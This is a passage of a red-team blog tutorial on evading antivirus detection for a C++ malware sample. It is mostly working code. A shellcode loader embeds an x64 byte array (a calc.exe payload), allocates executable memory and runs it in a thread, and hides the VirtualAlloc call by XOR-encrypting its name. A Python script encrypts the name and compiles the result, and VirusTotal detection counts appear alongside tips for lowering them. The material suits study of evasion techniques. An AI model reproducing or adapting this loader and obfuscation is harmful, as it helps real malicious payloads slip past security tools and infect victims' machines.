+<img src="/assets/images/3/2021-09-06_17-52.png" alt="deXOR" class="img-responsive" /></p>
+
+<p>So, the final version of our malware code is:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+cpp implementation malware example with calc.exe payload
+*/</span>
+<span class="cp">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="c1">// our payload calc.exe</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">my_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span>
+  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span>
+  <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span>
+  <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
+  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span>
+  <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
+  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span>
+  <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
+  <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span>
+  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
+  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span>
+  <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
+  <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span>
+  <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
+  <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x00</span>
+<span class="p">};</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">my_payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">my_payload</span><span class="p">);</span>
+
+<span class="c1">// XOR encrypted VirtualAlloc</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVirtualAlloc</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">};</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVirtualAllocLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVirtualAlloc</span><span class="p">);</span>
+
+<span class="c1">// encrypt/decrypt key</span>
+<span class="kt">char</span> <span class="n">mySecretKey</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"meowmeow"</span><span class="p">;</span>
+
+<span class="c1">// LPVOID VirtualAlloc(</span>
+<span class="c1">//   LPVOID lpAddress,</span>
+<span class="c1">//   SIZE_T dwSize,</span>
+<span class="c1">//   DWORD  flAllocationType,</span>
+<span class="c1">//   DWORD  flProtect</span>
+<span class="c1">// );</span>
+
+<span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVirtualAlloc</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flProtect</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+            <span class="n">j</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span> <span class="n">my_payload_mem</span><span class="p">;</span> <span class="c1">// memory buffer for payload</span>
+  <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
+  <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
+  <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+
+  <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cVirtualAlloc</span><span class="p">,</span> <span class="n">cVirtualAllocLen</span><span class="p">,</span> <span class="n">mySecretKey</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mySecretKey</span><span class="p">));</span>
+
+  <span class="c1">// Allocate a memory buffer for payload</span>
+  <span class="n">pVirtualAlloc</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cVirtualAlloc</span><span class="p">);</span>
+
+  <span class="n">my_payload_mem</span> <span class="o">=</span> <span class="n">pVirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">my_payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+
+  <span class="c1">// copy payload to buffer</span>
+  <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">my_payload_mem</span><span class="p">,</span> <span class="n">my_payload</span><span class="p">,</span> <span class="n">my_payload_len</span><span class="p">);</span>
+
+  <span class="c1">// make new buffer as executable</span>
+  <span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">my_payload_mem</span><span class="p">,</span> <span class="n">my_payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+
+    <span class="c1">// run payload</span>
+    <span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">my_payload_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>And use python script to XOR encrypt our function name and replace:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="c1">## XOR function to encrypt data
+</span><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">output_str</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
+        <span class="n">current</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">current_key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span>
+        <span class="n">ordd</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="k">else</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">output_str</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ordd</span><span class="p">(</span><span class="n">current</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">current_key</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">output_str</span>
+
+<span class="c1">## encrypting
+</span><span class="k">def</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="n">ciphertext</span> <span class="o">=</span> <span class="s">'{ 0x'</span> <span class="o">+</span> <span class="s">', 0x'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="s">' };'</span>
+    <span class="k">print</span> <span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span>
+
+<span class="c1">## key for encrypt/decrypt
+</span><span class="n">plaintext</span> <span class="o">=</span> <span class="s">"VirtualAlloc"</span>
+<span class="n">my_secret_key</span> <span class="o">=</span> <span class="s">"meowmeow"</span>
+
+<span class="c1">## encrypt VirtualAlloc
+</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">p_key</span> <span class="o">=</span> <span class="n">xor_encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">my_secret_key</span><span class="p">)</span>
+
+<span class="c1">## open and replace our payload in C++ code
+</span><span class="n">tmp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"evil.cpp"</span><span class="p">,</span> <span class="s">"rt"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'unsigned char cVirtualAlloc[] = { };'</span><span class="p">,</span> <span class="s">'unsigned char cVirtualAlloc[] = '</span> <span class="o">+</span> <span class="n">ciphertext</span><span class="p">)</span>
+<span class="n">tmp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">tmp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"evil-enc.cpp"</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">)</span>
+<span class="n">tmp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">tmp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1">## compile
+</span><span class="k">try</span><span class="p">:</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"x86_64-w64-mingw32-gcc evil-enc.cpp -o evil.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc &gt;/dev/null 2&gt;&amp;1"</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span> <span class="p">(</span><span class="s">"error compiling malware template :("</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">print</span> <span class="p">(</span><span class="s">"successfully compiled :)"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Compile and check.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="nt">-n</span> 8 evil.exe | <span class="nb">grep</span> <span class="s2">"Virtual"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/3/2021-09-06_18-49.png" alt="strings virtual" class="img-responsive" /></p>
+
+<p>and as you can see no <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> in strings check.
+This is how you can actually obfuscate any function in your code. It can be <code class="language-plaintext highlighter-rouge">VirtualProtect</code> or <code class="language-plaintext highlighter-rouge">RtlMoveMemory</code>, etc.</p>
+
+<p>run:
+<img src="/assets/images/3/2021-09-07_00-54.png" alt="calc" class="img-responsive" /></p>
+
+<p>everything is ok.</p>
+
+<p>Let’s go to upload our <code class="language-plaintext highlighter-rouge">evil.exe</code> to virustotal:
+<img src="/assets/images/3/2021-09-07_01-01.png" alt="virustotal" class="img-responsive" /></p>
+
+<p><a href="https://www.virustotal.com/gui/file/bf21d0af617f1bad81ea178963d70602340d85145b96aba330018259bd02fe56/detection">https://www.virustotal.com/gui/file/bf21d0af617f1bad81ea178963d70602340d85145b96aba330018259bd02fe56/detection</a></p>
+
+<p><strong>So, 22 of of 66 AV engines detect our file as malicious.</strong></p>
+
+<p>Other functions can be obfuscated to reduce the number of AV engines that detect our malware.
+For better result we can combine payload encryption with random key and obfuscate functions with another keys etc.</p>
+
+<p><a href="https://github.com/cocomelonc/meow/tree/master/2021-09-06-av-evasion-2">Source code in Github</a></p>
+
+<ul>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a></li>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">RtlMoveMemory</a></li>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a></li>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject</a></li>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">CreateThread</a></li>
+  <li><a href="https://en.wikipedia.org/wiki/XOR_cipher">XOR</a></li>
+</ul>
+
+<p>As a result of my research, my project <a href="https://github.com/cocomelonc/peekaboo">peekaboo</a> appeared. <br />
+Simple undetectable shellcode and code injector launcher example.</p>
+
+<p>Thanks for your time, and good bye! <br />
+<em>PS. All drawings and screenshots are mine</em></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#malware" class="page__taxonomy-item p-category" rel="tag">malware</a><span class="sep">, </span>
+    
+      <a href="/tags/#red-team" class="page__taxonomy-item p-category" rel="tag">red team</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#tutorial" class="page__taxonomy-item p-category" rel="tag">tutorial</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-09-06T04:00:00+00:00">September 6, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=cocomelonc&text=AV+engines+evasion+for+C%2B%2B+simple+malware+-+part+2%20https%3A%2F%2Fcocomelonc.github.io%2Ftutorial%2F2021%2F09%2F06%2Fsimple-malware-av-evasion-2.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcocomelonc.github.io%2Ftutorial%2F2021%2F09%2F06%2Fsimple-malware-av-evasion-2.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
